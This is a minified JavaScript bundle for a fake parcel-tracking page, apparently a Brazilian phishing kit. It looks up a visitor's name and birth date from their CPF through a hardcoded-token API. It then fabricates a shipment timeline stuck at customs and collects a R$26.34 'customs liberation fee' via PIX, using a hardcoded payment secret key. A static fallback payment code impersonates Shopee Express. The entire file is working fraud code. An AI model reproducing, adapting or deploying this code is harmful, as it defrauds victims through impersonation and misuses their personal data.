import{C as u}from"./cpf-validator-B4PsRAE6.js";class f{constructor(){this.fallbackData=this.generateFallbackData(),console.log("DataService initialized")}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Fetching data for CPF:",t);try{const o=await this.tryAPI(t);if(o)return console.log("Data obtained from API:",o),o}catch(o){console.error("API failed, using fallback:",o.message)}return console.log("Using fallback data for CPF:",t),this.getFallbackData(t)}async tryAPI(e){const t=new AbortController,o=setTimeout(()=>t.abort(),1e4);try{console.log("Calling API endpoint for CPF:",e);const a=`/api/amnesia/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${e}`;console.log("🌐 API URL:",a);const n={signal:t.signal,method:"GET",headers:{Accept:"application/json","Content-Type":"application/json","Cache-Control":"no-cache"},credentials:"omit",cache:"no-store",mode:"cors"};console.log("📋 Fetch options:",n);const i=await fetch(a,n);if(clearTimeout(o),console.log("📊 Response status:",i.status,i.statusText),console.log("📋 Response headers:",Object.fromEntries(i.headers.entries())),!i.ok)throw console.error(`HTTP Error: ${i.status} - ${i.statusText}`),new Error(`API Error: ${i.status} - ${i.statusText}`);const c=await i.text();if(console.log("📄 API Response Text:",c),!c||c.trim()==="")throw console.error("Empty response from API"),new Error("Resposta vazia da API");try{const r=JSON.parse(c);if(console.log("📊 Parsed API data:",r),r&&r.DADOS&&r.DADOS.nome&&r.DADOS.cpf)return console.log("✅ API returned valid data:",{nome:r.DADOS.nome,cpf:r.DADOS.cpf,data_nascimento:r.DADOS.data_nascimento,sexo:r.DADOS.sexo}),r;throw console.error("❌ Invalid data format from API:",r),new Error("Formato de dados inválido da API")}catch(r){throw console.error("❌ JSON parse error:",r),new Error("Erro ao processar resposta da API: "+r.message)}}catch(a){throw clearTimeout(o),console.error("❌ API call error details:",{name:a.name,message:a.message,stack:a.stack}),a.name==="AbortError"?(console.error("⏰ Request was aborted (timeout)"),new Error("Timeout: A API demorou muito para responder")):a.message.includes("Failed to fetch")?(console.error("🌐 Network error - possibly CORS or connectivity issue"),new Error("Erro de conectividade: Não foi possível acessar a API externa")):a}}getFallbackData(e){const t=["João Silva Santos","Maria Oliveira Costa","Pedro Souza Lima","Ana Paula Ferreira","Carlos Eduardo Alves","Fernanda Santos Rocha","Ricardo Pereira Dias","Juliana Costa Martins","Bruno Almeida Silva","Camila Rodrigues Nunes","Rafael Santos Barbosa","Larissa Oliveira Cruz"],o=parseInt(e.slice(-2))%t.length,a=t[o];return console.log("Generated fallback data for CPF:",e,"Name:",a),{DADOS:{nome:a,cpf:e,data_nascimento:this.generateBirthDate(e),sexo:Math.random()>.5?"M":"F"}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,o=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${o.toString().padStart(2,"0")}/${t}`}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador portátil 10000mAh","Camiseta básica algodão","Tênis esportivo Nike","Relógio digital smartwatch"]}}}class g{static generateTrackingData(e){const t=new Date,o={cpf:e.cpf,currentStep:"customs",steps:[],liberationPaid:!1,liberationDate:null,deliveryAttempts:0,lastUpdate:t.toISOString()},a=this.generateRealisticDates(t,11),n=this.getTrackingSteps();for(let i=0;i<10;i++)o.steps.push({id:i+1,date:a[i],title:n[i].title,description:n[i].description,isChina:n[i].isChina||!1,completed:!0});return o.steps.push({id:11,date:a[10],title:n[10].title,description:n[10].description,completed:!0,needsLiberation:!0}),o}static generateRealisticDates(e,t){const o=[],a=new Date,n=new Date(e),i=new Date(n);i.setDate(i.getDate()-2),o.push(this.getRandomTimeOnDate(i)),o.push(this.getRandomTimeOnDate(i));const c=new Date(n);c.setDate(c.getDate()-1);for(let r=2;r<9;r++)o.push(this.getRandomTimeOnDate(c));return o.push(this.getTimeBeforeNow(n,a,1)),o.push(this.getTimeBeforeNow(n,a,2)),o}static getRandomTimeOnDate(e){const t=new Date(e),o=Math.floor(Math.random()*18)+5,a=Math.floor(Math.random()*60);return t.setHours(o,a,0,0),t}static getTimeBeforeNow(e,t,o){const a=new Date(e);t.getHours(),t.getMinutes();let n;o===1?n=Math.floor(Math.random()*4)+2:n=Math.random()*1.5+.5;const i=new Date(t);return i.setHours(i.getHours()-n),i.getHours()<6&&(i.setHours(6+Math.floor(Math.random()*2)),i.setMinutes(Math.floor(Math.random()*60))),a.setHours(i.getHours(),i.getMinutes(),0,0),a}static getTrackingSteps(){return[{title:"Seu pedido foi criado",description:"Seu pedido foi criado"},{title:"Preparando para envio",description:"O seu pedido está sendo preparado para envio"},{title:"Pedido enviado",description:"[China] O vendedor enviou seu pedido",isChina:!0},{title:"Centro de triagem",description:"[China] O pedido chegou ao centro de triagem de Shenzhen",isChina:!0},{title:"Centro logístico",description:"[China] Pedido saiu do centro logístico de Shenzhen",isChina:!0},{title:"Trânsito internacional",description:"[China] Coletado. O pedido está em trânsito internacional",isChina:!0},{title:"Liberado para exportação",description:"[China] O pedido foi liberado na alfândega de exportação",isChina:!0},{title:"Saiu da origem",description:"Pedido saiu da origem: Shenzhen"},{title:"Chegou no Brasil",description:"Pedido chegou no Brasil"},{title:"Centro de distribuição",description:"Pedido em trânsito para CURITIBA/PR"},{title:"Alfândega de importação",description:"Pedido chegou na alfândega de importação: CURITIBA/PR"}]}}class y{constructor(){this.baseURL="https://zentrapay-api.onrender.com",this.apiSecret=this.getApiSecret(),console.log("🔑 ZentraPayService inicializado com API oficial"),console.log("🔐 API Secret configurada:",this.apiSecret?"SIM":"NÃO")}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"sk_771c0f95ada260e7c2762cf26e2910dcc2efd47ca33899c5dc1c9d82c89b9be27f143f954da017fa9ffe9030ac5f0823cd50b6b6dee7a56c1a301dadf1b6a8f8";return e.startsWith("sk_")?(console.log("✅ API Secret Zentra Pay válida encontrada"),console.log("🔑 Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.error("❌ API Secret Zentra Pay inválida ou não configurada"),e}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t){var o,a;try{const n=Date.now(),i=this.generateUniqueEmail(n),c=this.generateUniquePhone(n),r=this.generateExternalId();if(this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.");const d={external_id:r,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:"https://meusite.com/webhook",items:[{id:"liberation_fee",title:"Taxa de Liberação Aduaneira",quantity:1,price:parseFloat(t),description:"Taxa única para liberação de objeto na alfândega",is_physical:!1}],ip:"8.8.8.8",customer:{name:e.nome,email:i,phone:c,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("🚀 Criando transação Zentra Pay com API oficial:",{external_id:d.external_id,total_amount:`R$ ${d.total_amount.toFixed(2)}`,payment_method:d.payment_method,webhook_url:d.webhook_url,ip:d.ip,customer:{name:d.customer.name,document:d.customer.document,email:d.customer.email,phone:d.customer.phone,document_type:d.customer.document_type}});const p={"api-secret":this.apiSecret,"Content-Type":"application/json"};console.log("📡 Headers da requisição (oficial):",{"api-secret":`${this.apiSecret.substring(0,20)}...`,"Content-Type":p["Content-Type"]});const l=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:p,body:JSON.stringify(d)});if(console.log("📡 Status da resposta:",l.status),console.log("📡 Headers da resposta:",Object.fromEntries(l.headers.entries())),!l.ok){const h=await l.text();throw console.error("❌ Erro na API Zentra Pay:",{status:l.status,statusText:l.statusText,body:h,headers:Object.fromEntries(l.headers.entries())}),new Error(`Erro na API: ${l.status} - ${h}`)}const s=await l.json();if(console.log("✅ Resposta Zentra Pay recebida:",{transaction_id:s.transaction_id||s.id,external_id:s.external_id,has_pix_payload:!!((o=s.pix)!=null&&o.payload),has_qr_code:!!((a=s.pix)!=null&&a.qr_code),status:s.status,payment_method:s.payment_method}),!s.pix||!s.pix.payload)throw console.error("❌ Resposta incompleta da API:",s),new Error("Resposta da API não contém os dados PIX necessários (pix.payload)");return console.log("🎉 PIX gerado com sucesso via API oficial!"),console.log("📋 PIX Payload (copia e cola):",s.pix.payload),{success:!0,externalId:r,pixPayload:s.pix.payload,qrCode:s.pix.qr_code||null,transactionId:s.transaction_id||s.id,email:i,telefone:c,valor:t,status:s.status||"pending",paymentMethod:s.payment_method||"PIX",timestamp:n}}catch(n){return console.error("💥 Erro ao criar transação PIX:",{message:n.message,stack:n.stack,apiSecret:this.apiSecret?"CONFIGURADA":"NÃO CONFIGURADA"}),{success:!1,error:n.message,details:n.stack}}}setApiSecret(e){return!e||!e.startsWith("sk_")?(console.error("❌ API Secret inválida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("🔑 API Secret Zentra Pay atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("🔍 Testando conexão com Zentra Pay..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida para teste de conexão");const e=await fetch(`${this.baseURL}/health`,{method:"GET",headers:{"api-secret":this.apiSecret,"Content-Type":"application/json"}});return e.ok?(console.log("✅ Conexão com Zentra Pay OK"),!0):(console.warn("⚠️ Problema na conexão:",e.status),!1)}catch(e){return console.error("❌ Erro ao testar conexão:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret.startsWith("sk_")?this.apiSecret.length<50?(console.error("❌ API Secret muito curta"),!1):(console.log("✅ API Secret válida"),!0):(console.error("❌ Formato de API Secret inválido"),!1):(console.error("❌ Nenhuma API Secret configurada"),!1)}}class b{static showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");if(t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden",!document.getElementById("trackingAnimations")){const o=document.createElement("style");o.id="trackingAnimations",o.textContent=`
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(o)}}static closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}static showError(e){const t=document.querySelector(".error-message");t&&t.remove();const o=document.createElement("div");o.className="error-message",o.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,o.textContent=e;const a=document.querySelector(".tracking-form");a&&(a.appendChild(o),setTimeout(()=>{o.parentNode&&(o.style.animation="slideUp 0.3s ease",setTimeout(()=>o.remove(),300))},5e3))}static scrollToElement(e,t=0){if(!e)return;const a=e.getBoundingClientRect().top+window.pageYOffset-t;window.scrollTo({top:a,behavior:"smooth"})}static animateTimeline(){document.querySelectorAll(".timeline-item").forEach((t,o)=>{setTimeout(()=>{t.style.opacity="1",t.style.transform="translateY(0)"},o*100)})}}class P{constructor(){this.dataService=new f,this.zentraPayService=new y,this.currentCPF=null,this.userData=null,this.trackingData=null,this.isInitialized=!1,this.pixData=null,this.liberationPaid=!1}async init(){if(!this.isInitialized){console.log("🚀 Inicializando sistema de rastreamento");try{this.setupCPFInput(),this.setupTrackingForm(),this.setupOrderDetailsAccordion(),this.setupModalEvents(),this.checkURLParams(),this.isInitialized=!0,console.log("✅ Sistema de rastreamento inicializado")}catch(e){console.error("❌ Erro na inicialização:",e)}}}showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden"}closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showError(e){const t=document.querySelector(".error-message");t&&t.remove();const o=document.createElement("div");o.className="error-message",o.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,o.textContent=e;const a=document.querySelector(".tracking-form");a&&(a.appendChild(o),setTimeout(()=>{o.parentNode&&(o.style.animation="slideUp 0.3s ease",setTimeout(()=>o.remove(),300))},5e3))}scrollToElement(e,t=0){if(!e)return;const a=e.getBoundingClientRect().top+window.pageYOffset-t;window.scrollTo({top:a,behavior:"smooth"})}setupCPFInput(){const e=document.getElementById("cpfInput");e&&(e.addEventListener("input",t=>{u.applyCPFMask(t.target)}),e.addEventListener("keypress",t=>{t.key==="Enter"&&(t.preventDefault(),this.handleTrackingSubmit())}))}setupTrackingForm(){const e=document.getElementById("trackingForm"),t=document.getElementById("trackButton");e&&e.addEventListener("submit",o=>{o.preventDefault(),this.handleTrackingSubmit()}),t&&t.addEventListener("click",o=>{o.preventDefault(),this.handleTrackingSubmit()})}async handleTrackingSubmit(){const e=document.getElementById("cpfInput"),t=document.getElementById("trackButton");if(!e||!t)return;console.error("❌ Elementos do formulário não encontrados");const o=e.value.trim();if(!o){this.showError("Por favor, digite um CPF");return}if(!u.isValidCPF(o)){this.showError("CPF inválido. Verifique os dados digitados.");return}this.currentCPF=u.cleanCPF(o),t.disabled=!0,t.innerHTML='<i class="fas fa-spinner fa-spin"></i> Rastreando...',this.showLoadingNotification();try{console.log("🔍 Buscando dados para CPF:",this.currentCPF);const a=await this.dataService.fetchCPFData(this.currentCPF);if(console.log("📊 Dados recebidos:",a),a&&a.DADOS){this.userData={nome:a.DADOS.nome,cpf:this.currentCPF,nascimento:a.DADOS.data_nascimento,situacao:"REGULAR"},console.log("✅ Dados obtidos:",this.userData),await new Promise(i=>setTimeout(i,2e3)),this.closeLoadingNotification(),this.displayOrderDetails(),this.generateTrackingData(),this.displayTrackingResults();const n=document.getElementById("orderDetails");n&&this.scrollToElement(n,100),setTimeout(()=>{this.highlightLiberationButton()},1500)}else throw new Error("Dados não encontrados")}catch(a){console.error("❌ Erro no rastreamento:",a),this.closeLoadingNotification(),this.showError("Erro ao buscar dados. Tente novamente.")}finally{t.disabled=!1,t.innerHTML='<i class="fas fa-search"></i> Rastrear Pacote'}}displayOrderDetails(){if(!this.userData)return;const e=document.getElementById("orderDetails"),t=document.getElementById("customerName"),o=document.getElementById("fullName"),a=document.getElementById("formattedCpf");e&&(e.style.display="block"),t&&(t.textContent=this.userData.nome.split(" ")[0]),o&&(o.textContent=this.userData.nome),a&&(a.textContent=u.formatCPF(this.userData.cpf))}generateTrackingData(){this.trackingData=g.generateTrackingData(this.userData)}displayTrackingResults(){const e=document.getElementById("trackingResults"),t=document.getElementById("customerNameStatus"),o=document.getElementById("currentStatus"),a=document.getElementById("trackingTimeline");e&&(e.style.display="block"),t&&(t.textContent=this.userData.nome.split(" ")[0]),o&&(o.textContent="Aguardando liberação aduaneira"),a&&this.renderTimeline(a),setTimeout(()=>{b.animateTimeline()},500)}renderTimeline(e){e.innerHTML="",this.trackingData.steps.forEach((t,o)=>{const a=this.createTimelineItem(t,o);e.appendChild(a)})}createTimelineItem(e,t){const o=document.createElement("div");o.className=`timeline-item ${e.completed?"completed":""}`,t===0&&o.classList.add("first");const a=e.date.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),n=e.date.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let i="";return e.needsLiberation&&(i=`
                <button class="liberation-button-timeline" data-liberation-button>
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `),o.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${a}</span>
                    <span class="time">${n}</span>
                </div>
                <div class="timeline-text">
                    <p>
                        ${e.isChina?'<span class="china-tag">[China]</span>':""}
                        ${e.description}
                    </p>
                    ${i}
                </div>
            </div>
        `,o}highlightLiberationButton(){const e=["[data-liberation-button]",".liberation-button-timeline"];let t=null;for(const o of e)if(t=document.querySelector(o),t)break;t||(t=Array.from(document.querySelectorAll("button")).find(a=>a.textContent&&a.textContent.includes("LIBERAR"))),t?(console.log("🔓 Botão de liberação encontrado"),this.setupLiberationButton(t),setTimeout(()=>{this.scrollToElement(t,100)},500)):(console.warn("⚠️ Botão de liberação não encontrado"),console.log("🔍 Tentando criar botão de liberação..."),this.createLiberationButtonIfMissing())}createLiberationButtonIfMissing(){const e=document.querySelectorAll(".timeline-item"),t=e[e.length-1];if(t&&!t.querySelector("[data-liberation-button]")){const o=t.querySelector(".timeline-text");if(o){const a=document.createElement("button");a.className="liberation-button-timeline",a.setAttribute("data-liberation-button","true"),a.innerHTML='<i class="fas fa-unlock"></i> LIBERAR OBJETO',o.appendChild(a),this.setupLiberationButton(a),console.log("✅ Botão de liberação criado automaticamente")}}}setupLiberationButton(e){e.addEventListener("click",()=>{this.showLiberationModal()}),e.style.animation="pulse 2s infinite",e.style.boxShadow="0 0 20px rgba(255, 107, 53, 0.6)"}async showLiberationModal(){console.log("🔓 Abrindo modal de liberação");const e=document.getElementById("liberationModal");if(e){try{console.log("🚀 Gerando PIX via Zentra Pay...");const t=await this.zentraPayService.createPixTransaction(this.userData,26.34);t.success?(console.log("🎉 PIX gerado com sucesso!"),this.pixData=t,this.updateModalWithRealPix()):(console.warn("⚠️ Erro ao gerar PIX, usando estático"),this.updateModalWithStaticPix())}catch(t){console.error("💥 Erro ao gerar PIX:",t),this.updateModalWithStaticPix()}e.style.display="flex",document.body.style.overflow="hidden"}}updateModalWithRealPix(){const e=document.getElementById("realPixQrCode"),t=document.getElementById("pixCodeModal");e&&this.pixData.pixPayload&&(e.src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`),t&&this.pixData.pixPayload&&(t.value=this.pixData.pixPayload),console.log("✅ Modal atualizado com PIX real")}updateModalWithStaticPix(){const e=document.getElementById("realPixQrCode"),t=document.getElementById("pixCodeModal"),o="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2";e&&(e.src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(o)}`),t&&(t.value=o),console.log("⚠️ Modal atualizado com PIX estático")}setupOrderDetailsAccordion(){const e=document.getElementById("detailsHeader"),t=document.getElementById("detailsContent"),o=document.querySelector(".toggle-icon");e&&t&&e.addEventListener("click",()=>{t.classList.contains("expanded")?(t.classList.remove("expanded"),o&&o.classList.remove("rotated")):(t.classList.add("expanded"),o&&o.classList.add("rotated"))})}setupModalEvents(){const e=document.getElementById("closeModal"),t=document.getElementById("copyPixButtonModal"),o=document.getElementById("liberationModal");e&&e.addEventListener("click",()=>{this.closeLiberationModal()}),t&&t.addEventListener("click",()=>{this.copyPixCode()}),o&&o.addEventListener("click",a=>{a.target===o&&this.closeLiberationModal()})}closeLiberationModal(){const e=document.getElementById("liberationModal");e&&(e.style.display="none",document.body.style.overflow="auto")}copyPixCode(){const e=document.getElementById("pixCodeModal"),t=document.getElementById("copyPixButtonModal");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX copiado:",e.value.substring(0,50)+"..."),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(o){console.error("❌ Erro ao copiar PIX:",o)}}fallbackCopy(e,t){try{document.execCommand("copy")&&(console.log("✅ PIX copiado via execCommand"),this.showCopySuccess(t))}catch(o){console.error("❌ Fallback copy falhou:",o)}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}checkURLParams(){new URLSearchParams(window.location.search).get("focus")==="cpf"&&setTimeout(()=>{const o=document.getElementById("cpfInput");o&&o.focus()},500)}setZentraPayApiSecret(e){this.zentraPayService&&this.zentraPayService.setApiSecret(e)}}export{P as TrackingSystem};
